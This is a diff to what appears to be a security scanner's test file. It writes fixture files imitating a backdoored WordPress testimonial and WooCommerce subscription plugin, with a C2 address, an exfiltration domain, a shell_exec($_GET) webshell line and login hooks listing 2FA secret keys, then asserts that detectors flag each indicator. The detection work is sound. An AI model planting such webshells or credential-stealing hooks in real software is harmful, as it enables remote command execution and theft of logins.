@@ -267,6 +267,32 @@ function run() {
     "Widget Factory Joomla Content Editor improper access control",
     "rogue profile allowed upload and execution of PHP code"
   ].join("\n"));
+  write(path.join(root, "var", "www", "wordpress", "wp-content", "plugins", "testimonial-pro", "readme.txt"), [
+    "=== Real Testimonials Pro ===",
+    "Stable tag: 3.2.5",
+    "ShapedPlugin account.shapedplugin.com CVE-2026-10735"
+  ].join("\n"));
+  write(path.join(root, "var", "www", "wordpress", "wp-content", "plugins", "testimonial-pro", "src", "Includes", "LicenseLoader.php"), [
+    "<?php",
+    "// ShapedPlugin loader note",
+    "$c2 = '194.76.217.28:2871';",
+    "require_once 'TestimonialPRO.php';"
+  ].join("\n"));
+  write(path.join(root, "var", "www", "wordpress", "wp-content", "plugins", "woocommerce-subscription", "install-persistent.php"), [
+    "<?php",
+    "// /wp-json/wc/v3/settings/apply arbitrary file write",
+    "$exfil = 'generate.2faplugin.org';",
+    "$opts = 'theme_options_scripts wc_nf_install_done';",
+    "$bypass = 'e268c35a06d85f672e70c9beecb4e5d1';",
+    "shell_exec($_GET['d'] ?? '');",
+  ].join("\n"));
+  write(path.join(root, "var", "www", "wordpress", "wp-content", "plugins", "woocommerce-subscription", "class-wc-subscription-trace-dispatch.php"), [
+    "<?php",
+    "add_action('wp_authenticate', 'trace_dispatch');",
+    "add_action('wp_login', 'trace_dispatch');",
+    "wp_2fa_totp_key wfls_2fa_secrets rsssl_totp_secret _two_factor_totp_key",
+    "woocommerce-subscription class-wc-subscription-trace-dispatch"
+  ].join("\n"));
   write(path.join(root, "opt", "splunk", "etc", "splunk.version"), [
     "VERSION=10.0.1",
     "Splunk Enterprise build fixture"
@@ -575,6 +601,13 @@ function run() {
   assert(ids.has("joomla-jce-cve-2026-48907-vulnerable-version"));
   assert(ids.has("joomla-jce-cve-2026-48907-poc-or-kev-reference"));
   assert(ids.has("joomla-jce-cve-2026-48907-profile-upload-review"));
+  assert(ids.has("shapedplugin-fake-plugin-path"));
+  assert(ids.has("shapedplugin-loader-or-persistence-file"));
+  assert(ids.has("shapedplugin-affected-pro-version"));
+  assert(ids.has("shapedplugin-network-indicator"));
+  assert(ids.has("shapedplugin-text-indicator"));
+  assert(ids.has("shapedplugin-credential-2fa-stealer"));
+  assert(ids.has("shapedplugin-rest-webshell-backdoor"));
   assert(ids.has("splunk-cve-2026-20253-kev-reference"));
   assert(ids.has("splunk-cve-2026-20253-postgres-sidecar-endpoint"));
   assert(ids.has("splunk-cve-2026-20253-enterprise-10-review"));
